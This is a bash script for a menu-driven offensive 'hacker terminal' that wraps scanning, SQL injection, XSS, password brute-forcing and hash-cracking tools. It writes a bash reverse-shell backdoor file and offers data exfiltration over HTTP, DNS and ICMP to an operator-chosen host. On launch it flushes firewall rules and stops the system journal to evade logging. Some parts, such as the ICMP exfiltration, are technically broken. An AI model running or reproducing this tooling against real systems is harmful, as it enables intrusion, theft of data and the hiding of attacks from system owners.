#!/bin/bash

# █▀▀ █▀█ █▀▀ ▀█▀ █░█ █▀▀ █▀▄   █▀▀ ▀▄▀ █▀▀ █▀▀
# █▄▄ █▄█ █▄▄ ░█░ █▀█ ██▄ █▄▀   ██▄ █░█ ██▄ █▄▄

# Colors (Dark Theme)
BLACK='\033[0;30m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
DARK_GRAY='\033[1;90m'
NC='\033[0m'

# Terminal Styles
BOLD='\033[1m'
UNDERLINE='\033[4m'
BLINK='\033[5m'
REVERSE='\033[7m'
HIDDEN='\033[8m'

# Version
VERSION="1.0"
CODENAME="PHANTOM"

# Animation function
typewriter() {
    text=$1
    delay=0.03
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
        sleep $delay
    done
    echo
}

# Matrix effect in background (optional)
matrix_effect() {
    if [ "$(command -v cmatrix)" ]; then
        (cmatrix -ab -u 3 -C blue &> /dev/null &)
        sleep 3
        pkill -f cmatrix
    fi
}

# Banner with hacker style
banner() {
    clear
    echo -e "${BLUE}  ████████████████████████████████████████████████████████████████████"
    echo -e "  ████▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄████"
    echo -e "  ████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████"
    echo -e "  ████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████"
    echo -e "  ████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████"
    echo -e "  ████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████"
    echo -e "  ████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████"
    echo -e "  ████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████"
    echo -e "  ████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████"
    echo -e "  ████▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀████"
    echo -e "  ████████████████████████████████████████████████████████████████████${NC}"
    echo -e ""
    echo -e "${RED}  █░█ ▄▀█ █▀▀ █▄░█ █▀▀ █▀█ ███████ █▀▀ █▀█ █▀█ █▀▀ █▀▄"
    echo -e "  █▀█ █▀█ █▄▄ █░▀█ ██▄ █▀▄ ███████ █▄▄ █▄█ █▀▄ ██▄ █▄▀${NC}"
    echo -e ""
    echo -e "${PURPLE}  +----------------------------------------------------------------+"
    echo -e "  | OPERATION: ${WHITE}${BLINK}${CODENAME}${NC}${PURPLE} | VERSION: ${WHITE}${VERSION}${NC}${PURPLE} | STATUS: ${GREEN}SECURE CONNECTION${NC}${PURPLE} |"
    echo -e "  +----------------------------------------------------------------+${NC}"
    echo -e ""
    echo -e "${DARK_GRAY}  [*] ${WHITE}Initializing secure terminal connection...${NC}"
    echo -e "${DARK_GRAY}  [*] ${WHITE}Encryption protocols enabled...${NC}"
    echo -e "${DARK_GRAY}  [*] ${WHITE}Proxy chain activated...${NC}"
    sleep 1
}

# Access control
access_check() {
    echo -e "${PURPLE}"
    echo -e "  +------------------------------+"
    echo -e "  | ${WHITE}SECURE ACCESS VERIFICATION${PURPLE} |"
    echo -e "  +------------------------------+${NC}"
    
    # Simple password protection (remove in production)
    read -s -p "${DARK_GRAY}  [*] ${WHITE}Enter Operation Passphrase: ${NC}" passphrase
    echo ""
    
    if [ "$passphrase" != "shadow" ]; then
        echo -e "${RED}  [!] ACCESS DENIED - UNAUTHORIZED ENTRY DETECTED${NC}"
        echo -e "${DARK_GRAY}  [*] ${WHITE}Terminating connection...${NC}"
        sleep 2
        exit 1
    else
        echo -e "${GREEN}  [+] ACCESS GRANTED - WELCOME OPERATIVE${NC}"
        echo -e "${DARK_GRAY}  [*] ${WHITE}Initializing systems...${NC}"
        sleep 1
    fi
}

# Covert mode functions
enable_stealth() {
    echo -e "${DARK_GRAY}  [*] ${WHITE}Enabling stealth mode...${NC}"
    echo -e "${DARK_GRAY}  [*] ${WHITE}Clearing logs...${NC}"
    sudo iptables -F
    sudo sysctl -w net.ipv4.conf.all.send_redirects=0 >/dev/null 2>&1
    echo -e "${GREEN}  [+] Stealth mode activated${NC}"
}

disable_tracking() {
    echo -e "${DARK_GRAY}  [*] ${WHITE}Disabling tracking mechanisms...${NC}"
    sudo systemctl stop systemd-journald >/dev/null 2>&1
    sudo swapoff -a && sudo swapon -a >/dev/null 2>&1
    echo -e "${GREEN}  [+] Tracking disabled${NC}"
}

# Main menu with hacker style
main_menu() {
    while true; do
        banner
        echo -e "${BLUE}  +------------------------------+"
        echo -e "  | ${WHITE}M A I N   M E N U${BLUE}         |"
        echo -e "  +------------------------------+${NC}"
        echo -e ""
        echo -e "${DARK_GRAY}  [1]${WHITE} Network Reconnaissance${NC}"
        echo -e "${DARK_GRAY}  [2]${WHITE} Web Exploitation${NC}"
        echo -e "${DARK_GRAY}  [3]${WHITE} Cryptographic Operations${NC}"
        echo -e "${DARK_GRAY}  [4]${WHITE} Covert Operations${NC}"
        echo -e "${DARK_GRAY}  [5]${WHITE} System Control${NC}"
        echo -e "${DARK_GRAY}  [6]${WHITE} Data Exfiltration${NC}"
        echo -e "${DARK_GRAY}  [7]${WHITE} Exit Terminal${NC}"
        echo -e ""
        echo -e "${PURPLE}  +------------------------------+"
        echo -e "  | ${WHITE}SELECT OPERATION:${PURPLE}          |"
        echo -e "  +------------------------------+${NC}"
        
        read -p "  > " choice
        
        case $choice in
            1) network_recon ;;
            2) web_exploit ;;
            3) crypto_ops ;;
            4) covert_ops ;;
            5) system_control ;;
            6) data_exfil ;;
            7) 
                echo -e "${DARK_GRAY}  [*] ${WHITE}Wiping traces...${NC}"
                sleep 1
                echo -e "${DARK_GRAY}  [*] ${WHITE}Terminating secure connection...${NC}"
                sleep 1
                echo -e "${GREEN}  [+] Session terminated. Stay in the shadows.${NC}"
                exit 0
                ;;
            *) 
                echo -e "${RED}  [!] INVALID SELECTION - TRY AGAIN${NC}"
                sleep 1
                ;;
        esac
    done
}

# Network reconnaissance module
network_recon() {
    while true; do
        banner
        echo -e "${BLUE}  +------------------------------+"
        echo -e "  | ${WHITE}N E T W O R K   R E C O N${BLUE}   |"
        echo -e "  +------------------------------+${NC}"
        echo -e ""
        echo -e "${DARK_GRAY}  [1]${WHITE} Stealth Port Scan${NC}"
        echo -e "${DARK_GRAY}  [2]${WHITE} Network Mapping${NC}"
        echo -e "${DARK_GRAY}  [3]${WHITE} Traffic Analysis${NC}"
        echo -e "${DARK_GRAY}  [4]${WHITE} Wireless Recon${NC}"
        echo -e "${DARK_GRAY}  [5]${WHITE} Return to Main Menu${NC}"
        echo -e ""
        
        read -p "  > " choice
        
        case $choice in
            1)
                read -p "  [*] Enter target IP/hostname: " target
                echo -e "${DARK_GRAY}  [*] ${WHITE}Initiating stealth scan...${NC}"
                sudo nmap -sS -T4 -Pn -n -v --open --min-rate 5000 "$target"
                ;;
            2)
                read -p "  [*] Enter network range (CIDR): " network
                echo -e "${DARK_GRAY}  [*] ${WHITE}Mapping network topology...${NC}"
                sudo nmap -sn -PE -n "$network"
                ;;
            3)
                read -p "  [*] Enter interface (e.g., eth0): " interface
                echo -e "${DARK_GRAY}  [*] ${WHITE}Starting traffic capture...${NC}"
                sudo tcpdump -i "$interface" -w capture.pcap
                ;;
            4)
                echo -e "${DARK_GRAY}  [*] ${WHITE}Scanning wireless networks...${NC}"
                sudo airodump-ng wlan0
                ;;
            5)
                return
                ;;
            *)
                echo -e "${RED}  [!] INVALID SELECTION${NC}"
                ;;
        esac
        read -p "  [*] Press enter to continue..."
    done
}

# Web exploitation module
web_exploit() {
    while true; do
        banner
        echo -e "${BLUE}  +------------------------------+"
        echo -e "  | ${WHITE}W E B   E X P L O I T${BLUE}      |"
        echo -e "  +------------------------------+${NC}"
        echo -e ""
        echo -e "${DARK_GRAY}  [1]${WHITE} Web Vulnerability Scan${NC}"
        echo -e "${DARK_GRAY}  [2]${WHITE} SQL Injection${NC}"
        echo -e "${DARK_GRAY}  [3]${WHITE} XSS Testing${NC}"
        echo -e "${DARK_GRAY}  [4]${WHITE} Directory Bruteforce${NC}"
        echo -e "${DARK_GRAY}  [5]${WHITE} Return to Main Menu${NC}"
        echo -e ""
        
        read -p "  > " choice
        
        case $choice in
            1)
                read -p "  [*] Enter target URL: " target
                echo -e "${DARK_GRAY}  [*] ${WHITE}Scanning for vulnerabilities...${NC}"
                nikto -h "$target" -Tuning x456
                ;;
            2)
                read -p "  [*] Enter vulnerable URL: " target
                echo -e "${DARK_GRAY}  [*] ${WHITE}Testing SQL injection points...${NC}"
                sqlmap -u "$target" --batch --crawl=2
                ;;
            3)
                read -p "  [*] Enter target URL: " target
                echo -e "${DARK_GRAY}  [*] ${WHITE}Testing for XSS vulnerabilities...${NC}"
                xsser -u "$target" --auto
                ;;
            4)
                read -p "  [*] Enter target URL: " target
                echo -e "${DARK_GRAY}  [*] ${WHITE}Starting directory bruteforce...${NC}"
                dirb "$target" /usr/share/wordlists/dirb/common.txt
                ;;
            5)
                return
                ;;
            *)
                echo -e "${RED}  [!] INVALID SELECTION${NC}"
                ;;
        esac
        read -p "  [*] Press enter to continue..."
    done
}

# Crypto operations module
crypto_ops() {
    while true; do
        banner
        echo -e "${BLUE}  +------------------------------+"
        echo -e "  | ${WHITE}C R Y P T O   O P S${BLUE}        |"
        echo -e "  +------------------------------+${NC}"
        echo -e ""
        echo -e "${DARK_GRAY}  [1]${WHITE} File Encryption${NC}"
        echo -e "${DARK_GRAY}  [2]${WHITE} File Decryption${NC}"
        echo -e "${DARK_GRAY}  [3]${WHITE} Hash Cracking${NC}"
        echo -e "${DARK_GRAY}  [4]${WHITE} Password Bruteforce${NC}"
        echo -e "${DARK_GRAY}  [5]${WHITE} Return to Main Menu${NC}"
        echo -e ""
        
        read -p "  > " choice
        
        case $choice in
            1)
                read -p "  [*] Enter file to encrypt: " file
                echo -e "${DARK_GRAY}  [*] ${WHITE}Encrypting file with AES-256...${NC}"
                openssl enc -aes-256-cbc -salt -in "$file" -out "$file.enc"
                echo -e "${GREEN}  [+] File encrypted: $file.enc${NC}"
                ;;
            2)
                read -p "  [*] Enter file to decrypt: " file
                echo -e "${DARK_GRAY}  [*] ${WHITE}Decrypting file...${NC}"
                openssl enc -aes-256-cbc -d -in "$file" -out "${file%.enc}"
                echo -e "${GREEN}  [+] File decrypted: ${file%.enc}${NC}"
                ;;
            3)
                read -p "  [*] Enter hash file: " hash_file
                read -p "  [*] Enter wordlist: " wordlist
                echo -e "${DARK_GRAY}  [*] ${WHITE}Cracking hashes...${NC}"
                john --wordlist="$wordlist" "$hash_file"
                ;;
            4)
                read -p "  [*] Enter target IP: " target
                read -p "  [*] Enter service (ssh/ftp/etc): " service
                read -p "  [*] Enter username: " user
                read -p "  [*] Enter wordlist: " wordlist
                echo -e "${DARK_GRAY}  [*] ${WHITE}Starting bruteforce attack...${NC}"
                hydra -l "$user" -P "$wordlist" "$target" "$service" -V
                ;;
            5)
                return
                ;;
            *)
                echo -e "${RED}  [!] INVALID SELECTION${NC}"
                ;;
        esac
        read -p "  [*] Press enter to continue..."
    done
}

# Covert operations module
covert_ops() {
    while true; do
        banner
        echo -e "${BLUE}  +------------------------------+"
        echo -e "  | ${WHITE}C O V E R T   O P S${BLUE}       |"
        echo -e "  +------------------------------+${NC}"
        echo -e ""
        echo -e "${DARK_GRAY}  [1]${WHITE} Enable Stealth Mode${NC}"
        echo -e "${DARK_GRAY}  [2]${WHITE} Disable Tracking${NC}"
        echo -e "${DARK_GRAY}  [3]${WHITE} Create Backdoor${NC}"
        echo -e "${DARK_GRAY}  [4]${WHITE} Establish Tunnel${NC}"
        echo -e "${DARK_GRAY}  [5]${WHITE} Return to Main Menu${NC}"
        echo -e ""
        
        read -p "  > " choice
        
        case $choice in
            1) enable_stealth ;;
            2) disable_tracking ;;
            3)
                read -p "  [*] Enter target IP: " target
                read -p "  [*] Enter port: " port
                echo -e "${DARK_GRAY}  [*] ${WHITE}Creating reverse shell backdoor...${NC}"
                echo "bash -i >& /dev/tcp/$target/$port 0>&1" > backdoor.sh
                echo -e "${GREEN}  [+] Backdoor created: backdoor.sh${NC}"
                ;;
            4)
                read -p "  [*] Enter proxy server: " proxy
                echo -e "${DARK_GRAY}  [*] ${WHITE}Establishing SSH tunnel...${NC}"
                ssh -D 8080 -f -C -q -N "$proxy"
                echo -e "${GREEN}  [+] SOCKS proxy established on 127.0.0.1:8080${NC}"
                ;;
            5)
                return
                ;;
            *)
                echo -e "${RED}  [!] INVALID SELECTION${NC}"
                ;;
        esac
        read -p "  [*] Press enter to continue..."
    done
}

# System control module
system_control() {
    while true; do
        banner
        echo -e "${BLUE}  +------------------------------+"
        echo -e "  | ${WHITE}S Y S T E M   C O N T R O L${BLUE}|"
        echo -e "  +------------------------------+${NC}"
        echo -e ""
        echo -e "${DARK_GRAY}  [1]${WHITE} Check System Info${NC}"
        echo -e "${DARK_GRAY}  [2]${WHITE} Check Running Processes${NC}"
        echo -e "${DARK_GRAY}  [3]${WHITE} Check Network Connections${NC}"
        echo -e "${DARK_GRAY}  [4]${WHITE} Check Open Ports${NC}"
        echo -e "${DARK_GRAY}  [5]${WHITE} Return to Main Menu${NC}"
        echo -e ""
        
        read -p "  > " choice
        
        case $choice in
            1)
                echo -e "${DARK_GRAY}  [*] ${WHITE}Gathering system information...${NC}"
                uname -a
                echo ""
                lscpu
                ;;
            2)
                echo -e "${DARK_GRAY}  [*] ${WHITE}Listing running processes...${NC}"
                ps aux
                ;;
            3)
                echo -e "${DARK_GRAY}  [*] ${WHITE}Checking network connections...${NC}"
                netstat -tulnp
                ;;
            4)
                echo -e "${DARK_GRAY}  [*] ${WHITE}Checking open ports...${NC}"
                ss -tulnp
                ;;
            5)
                return
                ;;
            *)
                echo -e "${RED}  [!] INVALID SELECTION${NC}"
                ;;
        esac
        read -p "  [*] Press enter to continue..."
    done
}

# Data exfiltration module
data_exfil() {
    while true; do
        banner
        echo -e "${BLUE}  +------------------------------+"
        echo -e "  | ${WHITE}D A T A   E X F I L${BLUE}       |"
        echo -e "  +------------------------------+${NC}"
        echo -e ""
        echo -e "${DARK_GRAY}  [1]${WHITE} Compress Data${NC}"
        echo -e "${DARK_GRAY}  [2]${WHITE} Exfiltrate via HTTP${NC}"
        echo -e "${DARK_GRAY}  [3]${WHITE} Exfiltrate via DNS${NC}"
        echo -e "${DARK_GRAY}  [4]${WHITE} Exfiltrate via ICMP${NC}"
        echo -e "${DARK_GRAY}  [5]${WHITE} Return to Main Menu${NC}"
        echo -e ""
        
        read -p "  > " choice
        
        case $choice in
            1)
                read -p "  [*] Enter directory to compress: " dir
                echo -e "${DARK_GRAY}  [*] ${WHITE}Creating compressed archive...${NC}"
                tar -czf exfil_data.tar.gz "$dir"
                echo -e "${GREEN}  [+] Archive created: exfil_data.tar.gz${NC}"
                ;;
            2)
                read -p "  [*] Enter target URL: " target
                echo -e "${DARK_GRAY}  [*] ${WHITE}Uploading data...${NC}"
                curl -F "file=@exfil_data.tar.gz" "$target"
                ;;
            3)
                read -p "  [*] Enter DNS server: " dns_server
                echo -e "${DARK_GRAY}  [*] ${WHITE}Sending data via DNS queries...${NC}"
                for i in $(base64 -w0 exfil_data.tar.gz | fold -w32); do
                    dig "$i.domain.com" @"$dns_server"
                done
                ;;
            4)
                read -p "  [*] Enter target IP: " target
                echo -e "${DARK_GRAY}  [*] ${WHITE}Sending data via ICMP packets...${NC}"
                sudo ping -p "$(xxd -p -c 16 exfil_data.tar.gz)" -c 10 "$target"
                ;;
            5)
                return
                ;;
            *)
                echo -e "${RED}  [!] INVALID SELECTION${NC}"
                ;;
        esac
        read -p "  [*] Press enter to continue..."
    done
}

# Initialization
access_check
enable_stealth
disable_tracking
main_menu
